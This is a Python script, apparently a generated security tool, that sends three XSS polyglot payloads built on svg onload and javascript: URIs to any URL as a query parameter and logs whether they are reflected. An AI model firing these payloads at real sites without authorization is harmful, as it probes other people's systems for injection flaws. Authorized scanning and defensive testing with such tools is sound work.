#!/usr/bin/env python3
"""
NEXUS DNA Security Agent: XSS_POLYGLOT_TESTER
Tier: A-Target (Production-Hardened)
Spec Hash: 5853535f504f4c59

Test web inputs for XSS using advanced polyglot payloads.
"""

import json
import logging
import requests
import sqlite3
import hashlib
import sys
import time
import re
from dataclasses import dataclass, field, asdict
from typing import List

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
logger = logging.getLogger("XSS_POLYGLOT_TESTER")

POLYGLOTS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()>\\x3e",
    "\"><svg/onload=alert(1)>",
    "javascript:alert(1)//"
]

MAX_RETRIES = 3
RETRY_BACKOFF = 2.0

@dataclass
class XssFinding:
    url: str
    payload: str
    context: str
    reflected: bool

@dataclass
class XssTesterReport:
    target_url: str
    findings: List[XssFinding] = field(default_factory=list)
    scanned_at: str = field(default_factory=lambda: time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
    errors: List[str] = field(default_factory=list)

class XssPolyglotTesterAgent:
    def __init__(self, db_path: str = "nexus_security.db"):
        self.db_path = db_path
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "NEXUS-SEC/1.0"})
        self._init_storage()

    def _init_storage(self) -> None:
        try:
            with sqlite3.connect(self.db_path) as conn:
                conn.execute("""CREATE TABLE IF NOT EXISTS xss_polyglot_tester 
                                (id INTEGER PRIMARY KEY, url TEXT, payload TEXT, context TEXT, reflected INTEGER, data_hash TEXT UNIQUE, ts DATETIME DEFAULT CURRENT_TIMESTAMP)""")
                conn.commit()
            logger.info("Storage ready.")
        except sqlite3.Error as exc:
            logger.critical("DB init failed: %s", exc)
            raise SystemExit(1) from exc

    @staticmethod
    def _hash(payload: str) -> str:
        return hashlib.sha256(payload.encode("utf-8")).hexdigest()

    def execute_scan(self, url: str) -> XssTesterReport:
        logger.info("Testing XSS reflections on %s", url)
        report = XssTesterReport(target_url=url)
        
        for p in POLYGLOTS:
            for attempt in range(1, MAX_RETRIES + 1):
                try:
                    resp = self.session.get(url, params={"q": p}, timeout=10)
                    if p in resp.text:
                        finding = XssFinding(url, p, "HTML Body", True)
                        report.findings.append(finding)
                        self._persist(finding)
                    break
                except Exception as e:
                    logger.error("Scan error: %s", e)
                    time.sleep(attempt * RETRY_BACKOFF)
                    if attempt == MAX_RETRIES:
                        report.errors.append(f"Failed to fetch for payload {p[:10]}")
                        
        return report

    def _persist(self, m: XssFinding) -> None:
        h = self._hash(f"{m.url}:{m.payload}")
        try:
            with sqlite3.connect(self.db_path) as conn:
                conn.execute("INSERT OR IGNORE INTO xss_polyglot_tester (url, payload, context, reflected, data_hash) VALUES (?,?,?,?,?)",
                             (m.url, m.payload, m.context, int(m.reflected), h))
        except sqlite3.Error as exc:
            logger.error("DB error: %s", exc)


if __name__ == "__main__":
    if len(sys.argv) < 2: 
        print("Usage: python 10_XSS_POLYGLOT_TESTER_synthesized_agent.py <url>")
        sys.exit(1)
    print(json.dumps(asdict(XssPolyglotTesterAgent().execute_scan(sys.argv[1])), indent=2))
